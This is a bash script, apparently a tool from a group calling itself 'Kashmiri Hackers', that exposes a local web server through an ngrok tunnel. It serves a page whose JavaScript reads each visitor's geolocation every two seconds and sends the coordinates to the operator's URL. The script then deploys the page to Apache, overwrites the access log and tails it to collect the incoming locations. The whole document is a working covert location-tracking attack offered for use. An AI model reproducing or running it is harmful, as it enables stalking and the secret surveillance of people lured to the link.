#!/bin/bash

#64_bit
xterm -e ./ngrok_64 http 80 & clear

#32_Bit
#xterm -e ./ngrok http 80 & clear


echo "                                         
                     888                                         
                     888                                         
                     888      .d88b.   .d8888b 888  888 .d8888b  
                     888     d88  88b d88P     888  888 88K    
                     888     888  888 888      888  888 'Y8888b. 
                     888     Y88..88P Y88b.    Y88b 888      X88 
                     88888888  Y88P    Y8888P   Y88888  88888P' "
sleep 5
read -p '           URL: ' varurl
echo "<!DOCTYPE html>

<html>
    <head>
        <title>Kashmiri Hackers</title>
        <style type=\"text/css\">
            
            body {
                background-image: url(\"Kh.jpg\");
                background-size: 1366px 768px;
                background-repeat: no-repeat;
            }

        </style>
    </head>
    <body>

        <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\" type='text/javascript' ></script>
        <script type='text/javascript'>
        function httpGet(theUrl)
        {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
            xmlHttp.send( null );
            return xmlHttp.responseText;
        }


        function autoUpdate() {
          navigator.geolocation.getCurrentPosition(function(position) {
            coords = position.coords.latitude + \",\" + position.coords.longitude;
             url = \""$varurl"/logme/\" + coords;
            httpGet(url);
            console.log('should be working');
            setTimeout(autoUpdate, 2000);
        })
        };
        \$(document).ready(function(){
           autoUpdate();
        });

        </script>
    </body>
</html>" > index.html

mv index.html /var/www/html/index.html
cp Kh.jpg /var/www/html/Kh.jpg
service apache2 start
echo "                                         
   888                                         
   888      .d88b.   .d8888b 888  888 .d8888b  
   888     d88  88b d88P     888  888 88K      
   888     888  888 888      888  888  Y8888b. 
   888     Y88..88P Y88b.    Y88b 888      X88 
   88888888 'Y88P    8Y8888P YYY88888  88888P' " > /var/log/apache2/access.log
xterm -e tail -f /var/log/apache2/access.log &
clear
exit
